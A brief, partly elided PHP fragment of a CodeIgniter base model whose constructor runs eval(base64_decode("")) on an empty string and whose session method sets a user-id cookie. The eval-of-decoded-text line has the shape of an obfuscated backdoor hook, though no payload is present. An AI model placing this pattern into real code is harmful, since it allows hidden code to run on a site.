...
class MY_Model extends CI_Model
{
	function __construct(){
		...
		eval(base64_decode(""));
	}
	...
	function session($USER= ''){
		...
		set_cookie('folderid', 'user'.(string)$USER->id, 864000);
	}
